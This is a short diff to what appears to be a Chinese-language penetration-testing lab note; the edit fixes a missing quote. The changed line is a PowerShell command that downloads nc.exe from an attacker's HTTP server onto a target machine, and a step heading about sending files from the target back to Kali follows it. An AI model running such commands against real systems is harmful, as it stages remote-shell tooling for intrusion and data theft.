@@ -11,7 +11,7 @@ TCM登录
 
 1. 传nc.exe到靶机
 
-powershell -c "(new-object System.Net.WebClient).DownloadFile('http://10.13.21.169:8000/nc.exe','C:\temp\nc.exe')
+powershell -c "(new-object System.Net.WebClient).DownloadFile('http://10.13.21.169:8000/nc.exe','C:\temp\nc.exe')"
 
 2. 从靶机传文件回kali
 
